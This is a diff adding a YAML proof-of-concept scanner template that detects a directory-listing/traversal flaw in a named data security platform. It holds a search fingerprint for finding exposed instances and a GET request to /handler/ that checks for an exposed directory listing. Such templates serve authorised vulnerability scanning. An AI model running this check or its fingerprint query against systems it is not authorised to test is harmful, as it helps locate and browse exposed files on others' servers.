@@ -1,0 +1,16 @@
+id: poc-yaml-hustcad-directory-traversal
+info:
+  name: 天喻软件数据安全平台 目录遍历漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: 天喻软件数据安全平台
+  hunter: web.body="数据安全"&&web.body="天喻"
+requests:
+- method: GET
+  path: /handler/
+  expression: "status_code == 200 && \ncontains(body,\"/handler/\") &&\ncontains(body,\"\
+    [To Parent Directory]\") &&\ncontains(body,\"DownLoad.ashx\") &&\ncontains(body,\"\
+    HREF=\")\n"
+variables: {}
+transport: http
